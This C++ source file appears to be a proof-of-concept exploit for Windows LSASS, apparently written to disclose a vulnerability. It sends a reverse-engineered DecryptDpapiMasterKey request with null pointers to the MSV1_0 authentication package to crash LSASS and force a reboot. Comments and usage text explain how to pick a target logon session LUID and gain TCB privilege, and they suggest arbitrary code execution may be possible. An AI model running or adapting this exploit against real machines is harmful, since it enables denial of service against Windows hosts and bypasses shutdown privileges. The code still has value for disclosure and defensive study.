#include <Windows.h>

#define SECURITY_WIN32
#include <codecvt>
#include <iomanip>
#include <iostream>
#include <locale>
#include <ntsecapi.h>
#include <security.h>
#include <string>
#include <vector>
#include <winerror.h>

#pragma comment(lib, "Secur32.lib")

enum class PROTOCOL_MESSAGE_TYPE : ULONG {
	Lm20ChallengeRequest = 0,
	Lm20GetChallengeResponse,
	EnumerateUsers,
	GetUserInfo,
	ReLogonUsers,
	ChangePassword,
	ChangeCachedPassword,
	GenericPassthrough,
	CacheLogon,
	SubAuth,
	DeriveCredential,
	CacheLookup,
	SetProcessOption,
	ConfigLocalAliases,
	ClearCachedCredentials,
	LookupToken,
	ValidateAuth,
	CacheLookupEx,
	GetCredentialKey,
	SetThreadOption,
	DecryptDpapiMasterKey,
	GetStrongCredentialKey,
	TransferCred,
	ProvisionTbal,
	DeleteTbalSecrets
};

// Reverse engineered
typedef struct _DECRYPT_DPAPI_MASTER_KEY_REQUEST {
	PROTOCOL_MESSAGE_TYPE MessageType{ PROTOCOL_MESSAGE_TYPE::DecryptDpapiMasterKey };
	// OWF password type. 0 for NtOwf, 1 for ShaOwf
	// Based off  NtlmCredIsoInProc::DecryptDpapiMasterKey
	DWORD IsLocalUserCredKey; // 1 means it is a SHA OWF
	LUID LogonSession;
	ULONG bcryptInputDataLength;
	PUCHAR bcryptInputData;
	DWORD cbMasterKeyIn;
	PUCHAR pbMasterKeyIn;
	UCHAR Reserved[32];
} DECRYPT_DPAPI_MASTER_KEY_REQUEST, * PDECRYPT_DPAPI_MASTER_KEY_REQUEST;

// Reverse engineered
typedef struct _DECRYPT_DPAPI_MASTER_KEY_RESPONSE {
	PROTOCOL_MESSAGE_TYPE MessageType;
	DWORD KeySize;
	UCHAR Key[];
} DECRYPT_DPAPI_MASTER_KEY_RESPONSE, * PDECRYPT_DPAPI_MASTER_KEY_RESPONSE;

int wmain(int argc, wchar_t** argv) {
	if (argc == 2) {
		// Get the user supplied luid
		auto luid{ std::stoul(argv[1], nullptr, 16) };
		// Prepare to send a request to the MSV1_0 package
		HANDLE lsaHandle;
		if (SUCCEEDED(LsaConnectUntrusted(&lsaHandle))) {
			std::vector<char> buffer{ MSV1_0_PACKAGE_NAME, MSV1_0_PACKAGE_NAME + sizeof(MSV1_0_PACKAGE_NAME) };
			LSA_STRING apName = { buffer.size() - 1, buffer.size(), buffer.data() };
			ULONG apId;
			if (SUCCEEDED(LsaLookupAuthenticationPackage(lsaHandle, &apName, &apId))) {
				// The DECRYPT_DPAPI_MASTER_KEY_REQUEST structure was reverse engineered
				// It will be different from internal Microsoft sources but should be
				// close enough to verify the issue
				DECRYPT_DPAPI_MASTER_KEY_REQUEST request;
				request.IsLocalUserCredKey = 1;
				// This must be a valid for a logon session managed by MSV1_0
				request.LogonSession.LowPart = luid;
				request.LogonSession.HighPart = 0;
				// Specify that data is being supplied but set both data pointers to 0
				// Any arbitrary pointer can be supplied and will not be checked by LSASS
				// 0 is supplied to demonstrate a null-pointer dereference that will crash LSASS
				// and force the host to reboot because a critical process was terminated
				//
				// Users may immediately abuse the issue to bypass not having SeShutdownPrivilege.
				// Gaining arbitrary code execution may be possible but has not been proven.
				request.bcryptInputDataLength = 100;
				request.bcryptInputData = 0;
				request.cbMasterKeyIn = 1000;
				request.pbMasterKeyIn = 0;
				std::memset(request.Reserved, '\0', sizeof(request.Reserved));

				// Caution. This will send the request which will crash LSASS and your machine will be restarted.
				PDECRYPT_DPAPI_MASTER_KEY_RESPONSE response;
				DWORD requestSize{ sizeof(request) };
				ULONG responseSize;
				NTSTATUS status;
				std::cout << "MSV1_0 -> DecryptDpapiMasterKey Output" << std::endl;
				if (SUCCEEDED(LsaCallAuthenticationPackage(lsaHandle, apId, &request, requestSize, reinterpret_cast<PVOID*>(&response), &responseSize, &status)) && SUCCEEDED(status)) {
					// If the request was recieve the output will never be received because LSASS has crashed
					// 
					// If the LSASS has not crashed than your request was not accepted by LSASS. That is
					// likely due to not running the POC as a process with the TCB privilege. Please rerun
					// the POC as a process with TCB privilege to verify. The easiest way to test this is to
					// right click a System process (ex. winlogon) in a program such as "process hacker" or
					// "system informer", choose "Miscellanious -> Run as this user..." then run the POC.
					LsaFreeReturnBuffer(response);
				}
			}
			LsaDeregisterLogonProcess(lsaHandle);
		}
	}
	else {
		std::wcout << argv[0] << L" <luid>" << std::endl << std::endl;
		std::cout << "A valid luid for a logon session managed by MSV1_0 is required." << std::endl;
		std::cout << "To find a usable LUID:" << std::endl;
		std::cout << "1. Run logonsessions64.exe from the System Internals Suite as admin" << std::endl;
		std::cout << "2. Identify an Interactive, NTLM session for a normal user account (any will work)" << std::endl;
		std::cout << "3. Use the logon session ID value as the LUID (ex. if the value is 00000000:00AABBCC, use 0xAABBCC)" << std::endl;
	}
}